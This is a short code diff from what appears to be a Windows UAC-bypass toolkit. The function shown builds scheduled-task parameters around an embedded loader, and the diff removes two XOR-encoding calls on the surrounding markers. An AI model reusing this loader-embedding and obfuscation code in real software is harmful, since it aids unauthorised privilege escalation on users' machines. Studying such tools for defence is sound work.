@@ -214,14 +214,12 @@ BSTR ucmxBuildParametersForTask(
 
         offsetPtr = workBuffer;
         RtlCopyMemory(offsetPtr, g_encodedTaskParamBegin, sizeof(g_encodedTaskParamBegin));
-        EncodeBuffer(offsetPtr, sizeof(g_encodedTaskParamBegin), AKAGI_XOR_KEY2);
         offsetPtr = RtlOffsetToPointer(offsetPtr, sizeof(g_encodedTaskParamBegin));
 
         RtlCopyMemory(offsetPtr, lpLoader, cbLoader);
         offsetPtr = RtlOffsetToPointer(offsetPtr, cbLoader);
 
         RtlCopyMemory(offsetPtr, g_encodedTaskParamEnd, sizeof(g_encodedTaskParamEnd));
-        EncodeBuffer(offsetPtr, sizeof(g_encodedTaskParamEnd), AKAGI_XOR_KEY2);
 
         bstrResult = SysAllocString(workBuffer);
 
